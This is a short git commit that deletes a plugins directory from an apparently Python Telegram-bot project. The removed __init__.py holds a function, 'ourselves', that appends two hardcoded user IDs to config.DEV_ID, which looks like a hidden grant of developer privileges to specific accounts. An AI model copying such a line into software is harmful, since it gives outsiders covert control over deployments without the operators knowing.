6c45015db0377cbf2a456f7811105cd4b74d1d08
Sayan <88580652+AkiyoSayan@users.noreply.github.com>
2024-03-31 15:00:16 +0530

    Delete plugins directory

--- plugins/__init__.py
+++
@@ -1,8 +0,0 @@
-from Main import *
-from Main.utils.decorators import *
-
-from Main.langs import *
-
-def ourselves() -> int:
-    config.DEV_ID.append(5552153244)
-    config.DEV_ID.append(1753314787)
